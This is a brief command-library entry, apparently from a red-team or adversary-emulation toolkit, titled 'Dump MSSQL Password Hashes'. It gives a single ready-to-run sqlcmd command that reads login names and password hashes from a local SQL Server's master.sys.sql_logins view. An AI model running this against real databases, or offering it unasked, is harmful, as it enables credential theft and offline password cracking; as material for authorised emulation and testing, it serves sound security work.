---
id: c352db43-250e-4301-a2cb-348012b358eb
name: Dump MSSQL Password Hashes
type: command
executor: bash
data: 'sqlcmd -E -S localhost -Q "SELECT name, password_hash FROM master.sys.sql_logins;"

  '
output: null
created_at: '2020-07-14T18:21:00.906725+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Dump MSSQL Password Hashes

```bash
sqlcmd -E -S localhost -Q "SELECT name, password_hash FROM master.sys.sql_logins;"

```
